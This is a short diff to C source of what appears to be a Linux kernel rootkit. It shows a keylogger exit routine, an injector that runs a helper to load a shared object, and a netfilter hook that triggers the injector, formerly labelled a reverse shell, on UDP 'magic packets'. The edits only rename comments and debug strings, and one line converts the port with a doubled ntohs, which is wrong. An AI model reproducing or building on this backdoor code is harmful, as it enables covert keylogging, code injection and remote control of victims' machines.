@@ -61,7 +61,7 @@ static void keylogger_exit_work_func(struct work_struct *work)
 
 static void injector_work_func(struct work_struct *work)
 {
-    char *argv[] = {REC_PATH, "s", NULL}; // "S" to signal receiver_helper that an so is expected 
+    char *argv[] = {REC_PATH, "s", NULL}; // "s" to signal receiver_helper that an so is expected 
     char *envp[] = {"HOME=/",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
                     NULL};
@@ -162,7 +162,7 @@ static unsigned int hook_func(void *priv,
                         if (!injector_initialized)
                         {
                             schedule_work(&injector_work);
-                            DBG_PRINT("[Listener] Reverse shell magic packet detected from %pI4:%d\n",
+                            DBG_PRINT("[Listener] Injector magic packet detected from %pI4:%d\n",
                                     &ip_header->saddr, ntohs(ntohs(udp_header->source)
                                 ));
                             injector_initialized = true;
@@ -178,7 +178,7 @@ static unsigned int hook_func(void *priv,
                         if (injector_initialized)
                         {
                             schedule_work(&injector_exit_work);
-                            DBG_PRINT("[Listener] Reverse shell exit magic packet detected from %pI4:%d\n",
+                            DBG_PRINT("[Listener] Injector exit magic packet detected from %pI4:%d\n",
                                     &ip_header->saddr, ntohs(ntohs(udp_header->source)
                                 ));
                             injector_initialized = false;
